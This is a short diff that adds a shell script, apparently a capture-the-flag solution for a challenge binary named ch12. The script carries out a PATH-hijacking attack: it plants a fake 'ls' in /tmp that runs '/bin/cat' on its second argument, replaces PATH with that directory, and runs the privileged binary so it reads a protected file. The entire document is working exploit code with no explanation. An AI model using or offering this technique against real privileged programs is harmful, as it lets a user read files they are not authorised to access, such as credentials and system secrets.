@@ -1,1 +1,5 @@
-
+mkdir /tmp/D1 && touch /tmp/D1/ls
+chmod +x /tmp/D1/ls
+echo "/bin/cat \$2" > /tmp/D1/ls
+PATH=/tmp/D1/
+./ch12
